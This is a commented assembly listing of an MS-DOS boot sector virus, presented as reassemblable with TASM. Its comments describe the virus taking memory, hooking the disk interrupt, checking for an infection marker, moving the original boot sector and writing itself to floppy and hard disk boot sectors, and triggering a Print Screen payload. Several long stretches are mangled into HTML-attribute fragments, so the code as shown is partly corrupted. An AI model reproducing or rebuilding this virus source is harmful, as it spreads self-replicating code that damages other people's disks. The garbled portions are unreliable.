

;===========================================================
;       Verified by reassembation (TASM)
;-----------------------------------------------------------

LF      EQU     0AH
CR      EQU     0DH

S0000   SEGMENT
        ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
        ORG     7C00H

L7C00:  JMP     SHORT   L7C23                           ;7C00 EB 21
        NOP                                             ;7C02 90

;-------disk parameter table (copied from victim)
        DB      'MSDOS3.3'                      ;7C03 4D 53 44 4F 53 33 2E 33
        DB      0,2 DUP(2),1                    ;7C0B 00 02 02 01
        DB      0,2,70H,0,0D0H                  ;7C0F 00 02 70 00 D0
        DB      2,0FDH,2,0,9                    ;7C14 02 FD 02 00 09
        DB      0,2,8 DUP(0)                    ;7C19 00 02 00 00 00 00 00 00 00 00
;------------------------------------------------

L7C23:  CLI                                             ;7C23 FA
        XOR     AX,AX                                   ;7C24 33 C0
        MOV     SS,AX                                   ;7C26 8E D0
        MOV     SP,0F000h                               ;7C28 BC 00 F0
        PUSH    DS                                      ;7C2B 1E
        PUSH    SS                                      ;7C2C 16
        POP     DS                                      ;7C2D 1F
        MOV     AX,DS:[413h]    ;BIOS memory size       ;7C2E A1 13 04
        SUB     AX,2            ;- 2KB                  ;7C31 2D 02 00
        MOV     DS:[413h],AX                            ;7C34 A3 13 04
        MOV     CL,6            ;KB -> paragraph        ;7C37 B1 06
        SHL     AX,CL                                   ;7C39 D3 E0
        MOV     ES,AX           ;new virus area segment ;7C3B 8E C0
        XOR     DI,DI                                   ;7C3D 33 FF
        MOV     SI,OFFSET L7C00                         ;7C3F BE 00 7C
        MOV     CX,200H         ;virus length           ;7C42 B9 00 02
        CLD                                             ;7C45 FC
        REPNZ   MOVSB                                   ;7C46 F2 A4

        MOV     DI,1B4H         ;int 6Dh vector address ;7C48 BF B4 01
        MOV     SI,4CH          ;int 13h vector address ;7C4B BE 4C 00
        MOV     AX,[SI]                                 ;7C4E 8B 04
        MOV     [DI],AX                                 ;7C50 89 05
        MOV     AX,[SI+2]                               ;7C52 8B 44 02
        MOV     [DI+2],AX                               ;7C55 89 45 02
        MOV     BX,95H          ;L7C95 - int 13h service;7C58 BB 95 00
        MOV     AX,ES           ;virus segment          ;7C5B 8C C0
        MOV     [SI],BX                                 ;7C5D 89 1C
        MOV     [SI+2],AX                               ;7C5F 89 44 02
        STI                                             ;7C62 FB

        PUSH    ES              ;virus segment          ;7C63 06
        MOV     AX,69H          ;= offset L7C69         ;7C64 B8 69 00
        PUSH    AX                                      ;7C67 50
        RETF                                            ;7C68 CB

        ;<------ continuation="" in="" new="" place="" xor="" ax,ax="" ;7c69="" 33="" c0="" mov="" es,ax="" ;7c6b="" 8e="" c0="" push="" cs="" ;7c6d="" 0e="" pop="" ds="" ;7c6e="" 1f="" mov="" cx,4="" ;retry="" count="" ;7c6f="" b9="" 04="" 00="" l7c72:="" push="" cx="" ;7c72="" 51="" xor="" ah,ah="" ;reset="" disk="" ;7c73="" 32="" e4="" int="" 6dh="" ;="int" 13h="" ;7c75="" cd="" 6d="" mov="" bx,offset="" l7c00="" ;buffer="" ;7c77="" bb="" 00="" 7c="" mov="" ax,201h="" ;read="" 1="" sector="" ;7c7a="" b8="" 01="" 02="" mov="" dh,ds:[15ch]="" ;head="" nr="" ;7c7d="" 8a="" 36="" 5c="" 01="" mov="" cx,ds:[15dh]="" ;track/sector="" ;7c81="" 8b="" 0e="" 5d="" 01="" int="" 6dh="" ;int="" 13h="" ;7c85="" cd="" 6d="" jnb="" l7c8e="" ;-=""> no error            ;7C87 73 05
        POP     CX                                      ;7C89 59
        LOOP    L7C72           ;-> retry               ;7C8A E2 E6
        INT     18H             ;BASIC loader           ;7C8C CD 18

L7C8E:  POP     CX                                      ;7C8E 59
        POP     DS                                      ;7C8F 1F
        db      0EAh,00h,7Ch,00h,00h                    ;7C90 EA 00 7C 00 00
;       JMP     FAR PTR 0000:7C00

;================================================
;       int 13h service routine
;------------------------------------------------
L0095:  PUSH    DS                                      ;7C95 1E
        PUSH    CS                                      ;7C96 0E
        POP     DS                                      ;7C97 1F
        CMP     AH,2            ;read ?                 ;7C98 80 FC 02
        JNZ     L7CBA           ;-> no, EXIT            ;7C9B 75 1D
        PUSH    AX                                      ;7C9D 50
                                ;<- establish="" new="" stack="" cli="" ;7c9e="" fa="" mov="" ax,ss="" ;7c9f="" 8c="" d0="" mov="" ds:[158h],ax="" ;="L7D58" ;7ca1="" a3="" 58="" 01="" mov="" ds:[15ah],sp="" ;="L7D5A" ;7ca4="" 89="" 26="" 5a="" 01="" mov="" ax,cs="" ;7ca8="" 8c="" c8="" mov="" ss,ax="" ;7caa="" 8e="" d0="" mov="" sp,7d0h="" ;7cac="" bc="" d0="" 07="" sti="" ;7caf="" fb="" push="" es="" ;7cb0="" 06="" push="" bx="" ;7cb1="" 53="" push="" si="" ;7cb2="" 56="" push="" di="" ;7cb3="" 57="" push="" cx="" ;7cb4="" 51="" push="" dx="" ;7cb5="" 52="" push="" cs="" ;7cb6="" 0e="" pop="" es="" ;7cb7="" 07="" jmp="" short="" l7cbd="" ;7cb8="" eb="" 03="" l7cba:="" jmp="" l7d50="" ;to="" make="" jump="" longer="" ;7cba="" e9="" 93="" 00="" l7cbd:="" mov="" ds:[161h],dl="" ;disk="" ;7cbd="" 88="" 16="" 61="" 01="" mov="" di,15ch="" ;="offset" l7d5c="head" ;7cc1="" bf="" 5c="" 01="" mov="" bx,171h="" ;buffer="" ;7cc4="" bb="" 71="" 01="" test="" dl,80h="" ;hdd="" ;7cc7="" f6="" c2="" 80="" jz="" l7cd6="" ;-=""> no                  ;7CCA 74 0A
        MOV     AL,3            ;boot sect.head = 3     ;7CCC B0 03
        STOSB                                           ;7CCE AA
        MOV     AX,10DH         ;track 0, sector 13h    ;7CCF B8 0D 01
        MOV     DH,1                                    ;7CD2 B6 01
        JMP     SHORT   L7CDE                           ;7CD4 EB 08

                                ;<- fdd="" l7cd6:="" mov="" al,1="" ;boot="" sect.head="1" ;7cd6="" b0="" 01="" stosb="" ;7cd8="" aa="" mov="" dh,0="" ;7cd9="" b6="" 00="" mov="" ax,3="" ;track="0," sector="3" ;7cdb="" b8="" 03="" 00="" l7cde:="" stosw="" ;7cde="" ab="" mov="" al,dh="" ;7cdf="" 8a="" c6="" stosb="" ;7ce1="" aa="" mov="" ax,201h="" ;read="" 1="" sector="" ;7ce2="" b8="" 01="" 02="" mov="" cx,1="" ;track="0," sector="1" ;7ce5="" b9="" 01="" 00="" int="" 6dh="" ;int="" 13h="" ;7ce8="" cd="" 6d="" jb="" l7d3b="" ;-=""> error               ;7CEA 72 4F
        MOV     SI,156H         ;offset L7D56           ;7CEC BE 56 01
        MOV     AX,[SI]                                 ;7CEF 8B 04
        ADD     SI,171H         ;L7D56 in readed boot   ;7CF1 81 C6 71 01
        CMP     AX,[SI]                                 ;7CF5 3B 04
        JZ      L7D3B           ;-> allready infected   ;7CF7 74 42

        XOR     AX,AX           ;reset disk             ;7CF9 33 C0
        INT     6DH             ;int 13h                ;7CFB CD 6D
        MOV     AX,301H         ;write 1 sector         ;7CFD B8 01 03
        MOV     DH,DS:[15Ch]    ;head                   ;7D00 8A 36 5C 01
        MOV     DL,DS:[161h]    ;disk                   ;7D04 8A 16 61 01
        MOV     CX,DS:[15Dh]    ;track/sector           ;7D08 8B 0E 5D 01
        MOV     BX,171H         ;buffer                 ;7D0C BB 71 01
        INT     6DH             ;int 13h                ;7D0F CD 6D
        JB      L7D3B           ;-> error               ;7D11 72 28
        MOV     SI,174h         ;disk parameter table   ;7D13 BE 74 01
        MOV     DI,3            ;in virus code          ;7D16 BF 03 00
        MOV     CX,20H          ;table length           ;7D19 B9 20 00
        REPZ    MOVSB                                   ;7D1C F3 A4
        MOV     AX,171H                                 ;7D1E B8 71 01
        SUB     AX,DI           ;171h-23h=14eh          ;7D21 2B C7
        ADD     SI,AX           ;194h+14eh=171h+171h    ;7D23 03 F0
        MOV     DI,171H         ;buffer address         ;7D25 BF 71 01
        MOV     CX,8FH          ;bytes to end of sector ;7D28 B9 8F 00
        REPZ    MOVSB                                   ;7D2B F3 A4
        XOR     BX,BX                                   ;7D2D 33 DB
        MOV     AX,301H         ;write 1 sector         ;7D2F B8 01 03
        MOV     DH,DS:15FH      ;boot sector head       ;7D32 8A 36 5F 01
        MOV     CX,1            ;track=0, sector=1      ;7D36 B9 01 00
        INT     6DH             ;int 13h                ;7D39 CD 6D

L7D3B:  CALL    L7D62           ;PrtScrn effect         ;7D3B E8 24 00
        POP     DX                                      ;7D3E 5A
        POP     CX                                      ;7D3F 59
        POP     DI                                      ;7D40 5F
        POP     SI                                      ;7D41 5E
        POP     BX                                      ;7D42 5B
        POP     ES                                      ;7D43 07
        CLI                                             ;7D44 FA
        MOV     AX,DS:158H      ;saved stack segment    ;7D45 A1 58 01
        MOV     SS,AX                                   ;7D48 8E D0
        MOV     SP,DS:15AH      ;saved stack pointer    ;7D4A 8B 26 5A 01
        STI                                             ;7D4E FB
        POP     AX                                      ;7D4F 58
                                ;<- exit="" l7d50:="" pop="" ds="" ;7d50="" 1f="" int="" 6dh="" ;int="" 13h="" ;7d51="" cd="" 6d="" retf="" 2="" ;7d53="" ca="" 02="" 00="" l0156="" dw="" 9082h="" ;infection="" ptr="" ;7d56="" 82="" 90="" l0158="" dw="" 023eh="" ;saved="" ss="" ;7d58="" 3e="" 02="" l015a="" dw="" 081ch="" ;saved="" sp="" ;7d5a="" 1c="" 08="" l015c="" db="" 1="" ;oryg.boot="" sector="" head="" ;7d5c="" 01="" l015d="" dw="" 3="" ;track/sector="" ;7d5d="" 03="" 00="" l015f="" db="" 0="" ;boot="" sec="" head="" 0="FD/1=HD;7D5F" 00="" l0160="" db="" 20h="" ;disk="" read="" nr="" to="" prtscrn;7d60="" 20="" l7d61="" db="" 1="" ;disk="" (0/1/80..)="" ;7d61="" 01="" ;="==============================================" ;="" virus="" effect="" routine="" ;-----------------------------------------------="" l7d62:="" mov="" al,ds:[160h]="" ;7d62="" a0="" 60="" 01="" dec="" al="" ;7d65="" fe="" c8="" jnz="" l7d70="" ;error="" (7d6d)="" ;7d67="" 75="" 07="" int="" 5="" ;prt="" scrn="" ;7d69="" cd="" 05="" dec="" al="" ;al:="0FFh" ;7d6b="" fe="" c8="" mov="" ds:[160h],al="" ;7d6d="" a2="" 60="" 01="" l7d70:="" retn="" ;7d70="" c3="" ;-------disk="" buffer/end="" of="" victim="" record--------="" l7d71="" db="" 36h,2ah,7ch,0cdh,13h,0c3h="" db="" cr,lf="" db="" 'non-system="" disk="" or="" disk="" error',cr,lf="" db="" 'replace="" and="" strike="" any="" key="" when="" ready',cr,lf="" db="" 0="" db="" cr,lf="" db="" 'disk="" boot="" failure',cr,lf="" db="" 0="" db="" 'io="" sys'="" db="" 'msdos="" sys'="" db="" 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0="" db="" 55h,0aah="" s0000="" ends="" end="" l7c00="" =""></-></-></-></------>